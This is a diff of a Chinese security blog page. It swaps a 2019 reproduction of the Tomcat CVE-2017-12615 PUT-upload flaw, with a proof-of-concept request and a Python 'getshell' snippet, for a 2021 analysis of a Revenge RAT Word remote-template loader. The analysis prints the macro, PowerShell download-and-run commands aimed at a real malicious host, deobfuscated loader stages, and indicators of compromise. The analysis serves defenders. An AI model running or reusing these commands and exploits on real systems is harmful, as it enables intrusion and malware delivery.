@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>CVE-2017-12615复现 | 九世的博客</title>
-  <meta name="keywords" content=" 漏洞复现 ">
-  <meta name="description" content="CVE-2017-12615复现 | 九世的博客">
+  <title>Revenge RAT加载器分析(word远程模板加载) | 九世的博客</title>
+  <meta name="keywords" content=" 恶意分析 ">
+  <meta name="description" content="Revenge RAT加载器分析(word远程模板加载) | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1737,9 +1737,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-CVE-2017-12615复现" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-Revenge-RAT加载器分析-word远程模板加载" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">CVE-2017-12615复现</h1>
+        <h1 class="article-title">Revenge RAT加载器分析(word远程模板加载)</h1>
     
     <div class="article-meta">
         
@@ -1748,14 +1748,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color5">漏洞复现</a>
+            <a href="javascript:" class="color5">恶意分析</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-08-15 13:08:21">2019-08-15 10:08</time>
+        创建时间:<time class="date" title="更新时间: 2021-05-15 16:42:27">2021-05-15 16:27</time>
         
     </div>
     <div class="article-meta">
@@ -1777,7 +1777,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞介绍"><span class="toc-text">漏洞介绍</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#初始文件"><span class="toc-text">初始文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#模板文件"><span class="toc-text">模板文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xlsm文件"><span class="toc-text">xlsm文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NET文件"><span class="toc-text">.NET文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URLS"><span class="toc-text">URLS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HASHES"><span class="toc-text">HASHES</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1792,37 +1792,115 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>好久没复现过vulhub里的漏洞了，昨天晚上复现了一个。现在记录一下<br>复现的是CVE+2017-12615<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1565854600085&amp;di=5b63faebe1996522c2caa0354ef8fc2c&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201505%2F15%2F20150515230612_PxwH2.thumb.700_0.jpeg" alt="timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1565854600085&amp;di=5b63faebe1996522c2caa0354ef8fc2c&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201505%2F15%2F20150515230612_PxwH2.thumb.700_0.jpeg"></p>
-<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>利用条件：</p>
-<pre><code>Apache Tomcat允许PUT上传
-允许写入文件
-</code></pre><p><a href="https://vulhub.org/#/environments/tomcat/CVE-2017-12615/" target="_blank" rel="noopener">Vulhub - Docker-Compose file for vulnerability environment</a></p>
-<p>进入对应的文件夹执行</p>
-<pre><code>docker-compose build
-docker-compose up -d
-</code></pre><p><img src="https://s2.ax1x.com/2019/08/15/mA7etU.png" alt="mA7etU.png"></p>
-<p>访问如下<br><img src="https://s2.ax1x.com/2019/08/15/mA7thD.png" alt="mA7thD.png"></p>
-<p>开burp刷新发送POC</p>
-<pre><code>PUT /1.jsp/ HTTP/1.1
-Host: your-ip:8080
-Accept: */*
-Accept-Language: en
-User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
-Connection: close
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 5
+        <p>参考链接：<a href="https://www.uptycs.com/blog/revenge-rat-targeting-users-in-south-america" target="_blank" rel="noopener">https://www.uptycs.com/blog/revenge-rat-targeting-users-in-south-america</a><br>VT查杀<br><img src="https://z3.ax1x.com/2021/05/15/g6Qjoj.png" alt=""></p>
+<h2 id="初始文件"><a href="#初始文件" class="headerlink" title="初始文件"></a>初始文件</h2><p><img src="https://z3.ax1x.com/2021/05/15/g6Q7SP.png" alt=""></p>
+<p>方式:office vba远程模板加载<br><img src="https://z3.ax1x.com/2021/05/15/g6QzYn.png" alt=""></p>
+<p>随机加载<a href="http://azulviagens.online/1-9.docx将下载并执行其中一个模板。" target="_blank" rel="noopener">http://azulviagens.online/1-9.docx将下载并执行其中一个模板。</a><br>每个文件都具有相同的内容（相同的SHA-256：338b2d8d76f4028bfbd177127371b2509971606553d606c534316dc40cfa8fb9）<br><img src="https://z3.ax1x.com/2021/05/15/g6lClV.png" alt=""></p>
+<h2 id="模板文件"><a href="#模板文件" class="headerlink" title="模板文件"></a>模板文件</h2><blockquote>
+<p>模板文件（“ 1.docx” …“ 9x.docx”）遵循图4（如下所示）所示的结构。结构中的settings.xml具有指向XLSM文件的“目标”字段，该字段位于DOCX文件结构的“嵌入”目录中。XLSM文件“ Microsoft_Excel_Macro-Enabled_Worksheet.xlsm”到“ Microsoft_Excel_Macro-Enabled_Worksheet9.xlsm”具有相同的内容（相同的SHA-256：32f1a502126b1932e1def04b98d8be235c8d25ef7268f8cb35d460cd073a88b2）。当Microsoft Word执行模板文件（“ 1.docx” …“ 9x.docx”）时，它将执行XLSM文件之一（“ Microsoft_Excel_Macro-Enabled_Worksheet.xlsm”到“ Microsoft_Excel_Macro-Enabled_Worksheet9.xlsm”）<br><img src="https://z3.ax1x.com/2021/05/15/g6ltfI.png" alt=""></p>
+</blockquote>
+<p>docx模板中的XLSM文件<br><img src="https://z3.ax1x.com/2021/05/15/g6la1P.png" alt=""></p>
+<p>word/embeddings目录下任意一个xlsm文件<br><img src="https://z3.ax1x.com/2021/05/15/g6lykj.png" alt=""></p>
+<h2 id="xlsm文件"><a href="#xlsm文件" class="headerlink" title="xlsm文件"></a>xlsm文件</h2><p>该结构在“ VBAProject.bin”文件中包含宏。以下屏幕快照显示了包含宏的流。olevba提取宏</p>
+<pre><code>Dim Program As String, TaskID As Double
+Program = UserForm1.Image1.ControlTipText + UserForm1.Frame1.Tag + UserForm1.TabStrip1.ControlTipText + UserForm1.ScrollBar1.Tag
+Program01 = UserForm2.Image1.Tag + UserForm2.Frame1.ControlTipText
 
-shell
-</code></pre><p>返回状态码为201即为上传成功<br><img src="https://s2.ax1x.com/2019/08/15/mA7Wcj.png" alt="mA7Wcj.png"></p>
-<p>构造exp</p>
-<pre><code class="python">rqt=requests.put(url=url+&#39;{}&#39;.format(self.path),data=self.data,headers=self.headers,timeout=3)
-if rqt.status_code==201:
-    print(&#39;[+] getshell成功:{}&#39;.format(rqt.url))
-    print(&#39;[+] getshell成功:{}&#39;.format(rqt.url),file=open(&#39;save.txt&#39;,&#39;a&#39;))
+
+On Error Resume Next
+        AppActivate &quot;UserForm1&quot;
+If Err &lt;&gt; 0 Then
+                Err = 0
+TaskID = Shell(Program, 0) //PowerShell  -ex Bypass -nOp -w 1 iex(iwr(&#39;http://azulviagens.online/A.txt&#39;))
+TaskID01 = Shell(Program01, 0) //taskkill  /f /im WINWORD.EXE
+
+
+            If Err &lt;&gt; 0 Then MsgBox &quot;Can&#39;t start &quot; &amp; Program
+End If
+End Sub
+</code></pre><p><img src="https://z3.ax1x.com/2021/05/15/g6lXjK.png" alt=""></p>
+<p>UserForm1.Image1.ControlTipText olevba没看到，由于是shell函数执行的程序。火绒剑监控得到运行的内容<br><img src="https://z3.ax1x.com/2021/05/15/g6lvnO.png" alt=""></p>
+<p><img src="https://z3.ax1x.com/2021/05/15/g6lzHe.png" alt=""><br>(调用powershell远程下载执行)</p>
+<p><img src="https://z3.ax1x.com/2021/05/15/g61C4A.png" alt=""><br>(杀掉进程WINWORD.exe)</p>
+<p><code>http://azulviagens.online/A.txt</code>在复现的时候已经失效了，根据原文章的图如下</p>
+<pre><code class="vbs">$ProcName=&quot;index.vbs&quot;
+$WebFile=&quot;http://azulviagens.online/index.mp3&quot;
+C&#39;l&#39;e&#39;a&#39;r&#39;-&#39;H&#39;o&#39;s&#39;t&#39;
+(N&#39;e&#39;W-&#39;O&#39;b&#39;j&#39;e&#39;c&#39;t&#39; S&#39;y&#39;s&#39;t&#39;e&#39;m&#39;.&#39;N&#39;e&#39;t&#39;.&#39;W&#39;e&#39;b&#39;C&#39;l&#39;ient).DownloadFile($WebFile,&quot;$env:APPDATA\$ProcName&quot;) #保存在C:\Users\&lt;Username&gt;\AppData\Roaming\index.vbs
+S&#39;t&#39;a&#39;r&#39;t&#39;-&#39;P&#39;r&#39;o&#39;c&#39;e&#39;s&#39;s (&quot;$env:APPDATA\$ProcName&quot;) #运行C:\Users\&lt;Username&gt;\AppData\Roaming\index.vbs
 </code></pre>
-<p>代码地址：<a href="https://github.com/422926799/python/tree/master/CVE-2017-12615" target="_blank" rel="noopener">https://github.com/422926799/python/tree/master/CVE-2017-12615</a></p>
-<p>效果不咋滴，估计都修复了。从fofa爬了60页没一个成的<br><img src="https://s2.ax1x.com/2019/08/15/mAHAvd.png" alt="mAHAvd.png"></p>
-<p><img src="https://s2.ax1x.com/2019/08/15/mAHnVP.png" alt="mAHnVP.png"></p>
+<p>最后运行index.vbs然后index.vbs远程下载/1.txt保存在Opera.vbs然后运行Opera.vbs<br><img src="https://z3.ax1x.com/2021/05/15/g61a59.png" alt=""></p>
+<p>最后是远程下载Opera.ps1并执行，ps1内容如下<br>重度混淆（<br><img src="https://z3.ax1x.com/2021/05/15/g61081.png" alt=""></p>
+<p>经过手动解密混淆，过程如下</p>
+<pre><code># Decode 1
+$a=iex  (  [CHar]36+[CHar]101  +[CHar]107+[CHar]108+[CHar]116+  [CHar]107+[CHar]116+  [CHar]101  +[CHar]107  +[CHar]100  +  [CHar]107+[CHar]113+  [CHar]106  +  [CHar]102+[CHar]100+[CHar]107  +[CHar]102  +  [CHar]100+[CHar]107+[CHar]102  +[CHar]107  +  [CHar]100  +[CHar]102+[CHar]107  +[CHar]115+  [CHar]100  +[CHar]107+  [CHar]115  +  [CHar]100  +[CHar]107+  [CHar]118  +  [CHar]99  +[CHar]107  +[CHar]107+  [CHar]101  +  [CHar]114  +[CHar]107+[CHar]101  +  [CHar]119  +  [CHar]116  +  [CHar]101  +  [CHar]107+  [CHar]114  +  [CHar]116+  [CHar]101+[CHar]107  +[CHar]121  +  [CHar]101  +  [CHar]107  +  [CHar]119  +[CHar]48  +[CHar]48  +  [CHar]48+  [CHar]48+  [CHar]61+[CHar]45+[CHar]74  +[CHar]111+  [CHar]105+  [CHar]110  +  [CHar]32+  [CHar]40  +[CHar]40+[CHar]49+  [CHar]49  +[CHar]49+[CHar]44  +  [CHar]32  +[CHar]49+[CHar]48+[CHar]53+  [CHar]44+[CHar]32+[CHar]49  +[CHar]51+  [CHar]48+  [CHar]41+  [CHar]124+  [CHar]32  +[CHar]70+[CHar]111+[CHar]114  +[CHar]69+  [CHar]97  +  [CHar]99  +  [CHar]104  +[CHar]45+[CHar]79+  [CHar]98+  [CHar]106+[CHar]101+[CHar]99  +  [CHar]116  +[CHar]32  +[CHar]123  +[CHar]40+[CHar]32+[CHar]91  +  [CHar]67  +[CHar]111+  [CHar]110+[CHar]118+  [CHar]101+[CHar]114+  [CHar]116  +[CHar]93+[CHar]58  +[CHar]58+  [CHar]84  +  [CHar]111+  [CHar]73  +  [CHar]110+  [CHar]116+[CHar]49+  [CHar]54  +[CHar]40  +[CHar]40+[CHar]91  +  [CHar]83+[CHar]116+  [CHar]114  +  [CHar]105+  [CHar]110  +  [CHar]103+[CHar]93+  [CHar]36+  [CHar]95+[CHar]32  +  [CHar]41+  [CHar]44  +  [CHar]32  +  [CHar]56+  [CHar]41+[CHar]32+[CHar]45+[CHar]65  +  [CHar]115+  [CHar]91+[CHar]67  +[CHar]104  +  [CHar]97  +[CHar]114+[CHar]93+[CHar]41+  [CHar]125  +[CHar]41  +[CHar]59  +[CHar]115+[CHar]97  +  [CHar]108+[CHar]32+  [CHar]103  +  [CHar]32+  [CHar]36  +[CHar]101  +  [CHar]107  +[CHar]108+  [CHar]116+  [CHar]107+[CHar]116+[CHar]101  +  [CHar]107  +[CHar]100  +[CHar]107  +  [CHar]113  +[CHar]106+  [CHar]102  +  [CHar]100+[CHar]107  +[CHar]102  +[CHar]100+[CHar]107+[CHar]102+[CHar]107  +[CHar]100  +  [CHar]102  +[CHar]107+  [CHar]115  +  [CHar]100+  [CHar]107  +[CHar]115+  [CHar]100+  [CHar]107  +  [CHar]118  +  [CHar]99  +[CHar]107  +  [CHar]107  +[CHar]101  +  [CHar]114  +  [CHar]107+  [CHar]101+  [CHar]119+  [CHar]116+[CHar]101+  [CHar]107  +  [CHar]114  +  [CHar]116+  [CHar]101  +[CHar]107  +[CHar]121  +[CHar]101  +  [CHar]107  +  [CHar]119+[CHar]48  +[CHar]48+  [CHar]48+[CHar]48  )
+
+
+
+
+# Decode 2
+$ekltktekdkqjfdkfdkfkdfksdksdkvckkerkewtekrtekyekw0000=-Join ((111, 105, 130)| ForEach-Object {( [Convert]::ToInt16(([String]$_ ), 8) -As[Char])});sal g $ekltktekdkqjfdkfdkfkdfksdksdkvckkerkewtekrtekyekw0000 #sal为set-alias变量缩写
+
+
+# Decode 3
+iex(  [CHar]70+  [CHar]117  +  [CHar]110  +  [CHar]99+  [CHar]116+  [CHar]105  +  [CHar]111+  [CHar]110  +  [CHar]32  +  [CHar]109+  [CHar]97+  [CHar]120+[CHar]100  +[CHar]111+[CHar]111  +[CHar]111  +[CHar]109  +[CHar]32+  [CHar]123+[CHar]13  +[CHar]10+[CHar]32+  [CHar]13+  [CHar]10  +[CHar]32  +[CHar]32+  [CHar]32+[CHar]32  +  [CHar]91  +  [CHar]67+  [CHar]109  +[CHar]100+[CHar]108+  [CHar]101  +  [CHar]116+[CHar]66+[CHar]105+  [CHar]110  +[CHar]100  +[CHar]105+  [CHar]110  +  [CHar]103  +  [CHar]40  +[CHar]41  +  [CHar]93+  [CHar]13  +  [CHar]10  +[CHar]32+  [CHar]32  +  [CHar]32  +  [CHar]32  +[CHar]91  +[CHar]79  +[CHar]117  +[CHar]116+  [CHar]112  +[CHar]117  +[CHar]116  +  [CHar]84+  [CHar]121+  [CHar]112+[CHar]101+  [CHar]40+  [CHar]91  +[CHar]98+  [CHar]121  +  [CHar]116+[CHar]101+[CHar]91  +  [CHar]93+[CHar]93  +[CHar]41+  [CHar]93  +[CHar]13  +  [CHar]10+  [CHar]32+  [CHar]32+  [CHar]32  +  [CHar]32  +[CHar]112+[CHar]97  +[CHar]114  +[CHar]97  +[CHar]109  +[CHar]40  +  [CHar]13  +  [CHar]10  +  [CHar]32+  [CHar]32+  [CHar]32+  [CHar]32+[CHar]32  +[CHar]32+[CHar]32  +[CHar]32  +  [CHar]91  +  [CHar]80+[CHar]97+  [CHar]114  +  [CHar]97  +[CHar]109+[CHar]101+  [CHar]116  +[CHar]101  +  [CHar]114+  [CHar]40+[CHar]77+  [CHar]97  +[CHar]110  +[CHar]100+  [CHar]97+[CHar]116  +[CHar]111  +  [CHar]114  +[CHar]121  +[CHar]61+[CHar]36+  [CHar]116+  [CHar]114+[CHar]117+[CHar]101  +  [CHar]41+[CHar]93  +[CHar]32  +  [CHar]91+  [CHar]83  +  [CHar]116  +[CHar]114+[CHar]105  +[CHar]110+[CHar]103  +  [CHar]93+  [CHar]36+[CHar]122+  [CHar]88+[CHar]97+[CHar]87  +  [CHar]86  +  [CHar]80+[CHar]105+  [CHar]13  +[CHar]10  +  [CHar]32  +  [CHar]32  +  [CHar]32+  [CHar]32+  [CHar]41+[CHar]13  +[CHar]10  +[CHar]32+[CHar]32  +  [CHar]32+[CHar]32  +[CHar]36+[CHar]72+[CHar]116  +[CHar]116+[CHar]108  +[CHar]100+  [CHar]120  +[CHar]120  +  [CHar]49+  [CHar]115+  [CHar]49+  [CHar]115  +[CHar]51  +  [CHar]100+  [CHar]52  +  [CHar]102  +  [CHar]53+[CHar]118+  [CHar]53  +  [CHar]32  +  [CHar]61+[CHar]32  +  [CHar]78  +  [CHar]101  +[CHar]119  +[CHar]45+  [CHar]79  +  [CHar]98  +  [CHar]106  +[CHar]101  +  [CHar]99  +[CHar]116+  [CHar]32+[CHar]45+[CHar]84+  [CHar]121  +[CHar]112  +  [CHar]101  +  [CHar]78  +  [CHar]97+[CHar]109+  [CHar]101+  [CHar]32  +[CHar]98+[CHar]121+[CHar]116+[CHar]101+[CHar]91+[CHar]93  +  [CHar]32  +[CHar]45  +  [CHar]65  +[CHar]114+  [CHar]103+[CHar]117+  [CHar]109  +  [CHar]101+[CHar]110  +  [CHar]116+[CHar]76  +[CHar]105+[CHar]115+[CHar]116  +[CHar]32+[CHar]40  +  [CHar]36  +[CHar]122  +[CHar]88+  [CHar]97  +  [CHar]87+[CHar]86+  [CHar]80+  [CHar]105+  [CHar]46  +[CHar]76  +  [CHar]101+[CHar]110+  [CHar]103  +[CHar]116+  [CHar]104  +  [CHar]32  +[CHar]47  +  [CHar]32+  [CHar]50+  [CHar]41  +  [CHar]13  +  [CHar]10+  [CHar]32  +[CHar]32+[CHar]32  +[CHar]32+  [CHar]102+  [CHar]111  +  [CHar]114  +[CHar]32+  [CHar]40+[CHar]36  +[CHar]105  +[CHar]32  +  [CHar]61  +[CHar]32  +  [CHar]48  +  [CHar]59  +[CHar]32+  [CHar]36  +  [CHar]105  +[CHar]32+  [CHar]45+[CHar]108+[CHar]116  +[CHar]32  +  [CHar]36+[CHar]122+  [CHar]88  +  [CHar]97  +  [CHar]87+  [CHar]86+  [CHar]80  +  [CHar]105+  [CHar]46  +[CHar]76  +  [CHar]101  +[CHar]110  +[CHar]103  +[CHar]116  +[CHar]104+[CHar]59+  [CHar]32+  [CHar]36+  [CHar]105+  [CHar]32+[CHar]43  +[CHar]61+[CHar]32  +[CHar]50  +  [CHar]41  +[CHar]32+[CHar]123+  [CHar]13  +[CHar]10+  [CHar]32  +  [CHar]32+[CHar]32+[CHar]32  +[CHar]32  +[CHar]32  +  [CHar]32  +  [CHar]32  +[CHar]36  +  [CHar]72+[CHar]116+[CHar]116  +[CHar]108+  [CHar]100+  [CHar]120+  [CHar]120  +[CHar]49+  [CHar]115+  [CHar]49  +[CHar]115+  [CHar]51  +  [CHar]100+  [CHar]52+[CHar]102  +[CHar]53+  [CHar]118+[CHar]53  +  [CHar]91+[CHar]36  +  [CHar]105+  [CHar]32+  [CHar]47  +[CHar]32+[CHar]50  +[CHar]93  +[CHar]32+  [CHar]61+[CHar]32+[CHar]91  +[CHar]67+  [CHar]111+  [CHar]110  +[CHar]118  +  [CHar]101+[CHar]114+[CHar]116+[CHar]93  +  [CHar]58+[CHar]58  +  [CHar]84  +  [CHar]111  +[CHar]66+[CHar]121  +[CHar]116+[CHar]101+[CHar]40+  [CHar]36  +  [CHar]122  +  [CHar]88  +[CHar]97  +[CHar]87+  [CHar]86  +  [CHar]80+[CHar]105+[CHar]46  +  [CHar]83+  [CHar]117  +  [CHar]98  +[CHar]115  +[CHar]116  +  [CHar]114+  [CHar]105  +[CHar]110  +[CHar]103  +  [CHar]40+  [CHar]36  +  [CHar]105  +[CHar]44+  [CHar]32  +[CHar]50+  [CHar]41+[CHar]44  +[CHar]32  +  [CHar]49  +[CHar]54  +[CHar]41+  [CHar]13  +[CHar]10  +[CHar]32  +  [CHar]32+[CHar]32+[CHar]32  +  [CHar]125  +[CHar]13+  [CHar]10  +  [CHar]13+  [CHar]10+  [CHar]32  +  [CHar]32+[CHar]32  +[CHar]32  +[CHar]114  +  [CHar]101  +[CHar]116+  [CHar]117+[CHar]114+  [CHar]110+[CHar]32+  [CHar]91+  [CHar]98+  [CHar]121  +[CHar]116+  [CHar]101+[CHar]91  +[CHar]93+  [CHar]93  +  [CHar]36+[CHar]72+[CHar]116  +  [CHar]116+  [CHar]108+[CHar]100+[CHar]120  +[CHar]120+[CHar]49+  [CHar]115+  [CHar]49  +[CHar]115+[CHar]51+  [CHar]100+  [CHar]52+  [CHar]102+  [CHar]53+  [CHar]118+  [CHar]53+[CHar]13  +[CHar]10  +  [CHar]125  )
+
+
+
+
+# Decode 4
+Function maxdooom {
+
+
+    [CmdletBinding()]
+    [OutputType([byte[]])]
+    param(
+        [Parameter(Mandatory=$true)] [String]$zXaWVPi
+    )
+    $Httldxx1s1s3d4f5v5 = New-Object -TypeName byte[] -ArgumentList ($zXaWVPi.Length / 2)
+    for ($i = 0; $i -lt $zXaWVPi.Length; $i += 2) {
+        $Httldxx1s1s3d4f5v5[$i / 2] = [Convert]::ToByte($zXaWVPi.Substring($i, 2), 16)
+    }
+
+
+    return [byte[]]$Httldxx1s1s3d4f5v5
+}
+
+
+${\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`}  -&gt; IEX
+${!!!} -&gt; IEX
+&amp;( ([sTRIng]$vERbOsepreFERENcE)[1,3]+&#39;x&#39;-jOIN&#39;&#39;) -&gt; IEX
+</code></pre><p>第一行的混淆最终结果是这样的<br><img src="https://z3.ax1x.com/2021/05/15/g61h8I.png" alt=""></p>
+<p>第四行混淆<br><img src="https://z3.ax1x.com/2021/05/15/g61qaQ.png" alt=""></p>
+<p>第七行混淆<br><img src="https://z3.ax1x.com/2021/05/15/g61jGn.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/15/g63prT.png" alt=""></p>
+<p>最终解密得到后的ps1</p>
+<pre><code>sal g $ekltktekdkqjfdkfdkfkdfksdksdkvckkerkewtekrtekyekw0000
+[String]$CXCXxcxsderrewrttyrghbvvbc=&quot;&lt;BIN_HEX&gt;&quot;
+Function maxdooom {
+    [CmdletBinding()]
+    [OutputType([byte[]])]
+    param(
+        [Parameter(Mandatory=$true)] [String]$zXaWVPi
+    )
+    $Httldxx1s1s3d4f5v5 = New-Object -TypeName byte[] -ArgumentList ($zXaWVPi.Length / 2)
+    for ($i = 0; $i -lt $zXaWVPi.Length; $i += 2) {
+        $Httldxx1s1s3d4f5v5[$i / 2] = [Convert]::ToByte($zXaWVPi.Substring($i, 2), 16)
+    }
+    return [byte[]]$Httldxx1s1s3d4f5v5
+}
+
+[String]$Cmder2021=&quot;&lt;BIN_HEX&gt;&quot;
+</code></pre><h2 id="NET文件"><a href="#NET文件" class="headerlink" title=".NET文件"></a>.NET文件</h2><p>$CXCXxcxsderrewrttyrghbvvbc变量存的PE是Revenge RAT，上次就分析过这里了略过，分析链接：<a href="https://422926799.github.io/posts/43591be7.html">https://422926799.github.io/posts/43591be7.html</a><br><img src="https://z3.ax1x.com/2021/05/15/g63Zxx.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/15/g63mM6.png" alt=""></p>
+<p>$Cmder2021变量里的存的PE则是读取资源文件内存加载<br><img src="https://z3.ax1x.com/2021/05/15/g63nsK.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/15/g63uqO.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/15/g63MZD.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/15/g63GRI.png" alt=""></p>
+<p>资源文件<br><img src="https://z3.ax1x.com/2021/05/15/g63Jzt.png" alt=""></p>
+<h2 id="URLS"><a href="#URLS" class="headerlink" title="URLS"></a>URLS</h2><p><a href="http://azulviagens.online" target="_blank" rel="noopener">http://azulviagens.online</a><br>Cdtpitbull.hopto.org</p>
+<h2 id="HASHES"><a href="#HASHES" class="headerlink" title="HASHES"></a>HASHES</h2><p>Initial attack document<br>91611ac2268d9bf7b7cb2e71976c630f6b4bfdbb68774420bf01fd1493ed28c7</p>
+<p>Initial attack document<br>77d6651de47bff4c24fc26fa018ea648b0e14e276e8240fae6b1724b8638c46a</p>
+<p>1.docx(template)<br>338b2d8d76f4028bfbd177127371b2509971606553d606c534316dc40cfa8fb9</p>
+<p>Microsoft_Excel_Macro-Enabled_Worksheet.xlsm<br>32f1a502126b1932e1def04b98d8be235c8d25ef7268f8cb35d460cd073a88b2</p>
+<p>A.txt<br>4b65e5785692950f8100b22f2827d65ba93e99dd717eb444af035e96fcd84763</p>
+<p>opera.ps1<br>03f5ff9b6a6b24f76799cc15fe3f1fbf1ca9d6dda30a4154125ed5dd5834290c</p>
+<p>Revenge RAT<br>73f113a6146224c4a1f92f89055922a28322787c108e30000a0a420fa46ed9e2</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1832,12 +1910,12 @@ if rqt.status_code==201:
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>CVE-2017-12615复现</p>
+    <p><span class="copy-title">文章标题:</span>Revenge RAT加载器分析(word远程模板加载)</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-08-15, 10:08:24</p>
-    <p><span class="copy-title">最后更新:</span>2019-08-15, 13:08:21</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/310ec487.html" title="CVE-2017-12615复现">http://422926799.github.io/posts/310ec487.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-05-15, 16:27:48</p>
+    <p><span class="copy-title">最后更新:</span>2021-05-15, 16:42:27</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/ac1cf40.html" title="Revenge RAT加载器分析(word远程模板加载)">http://422926799.github.io/posts/ac1cf40.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
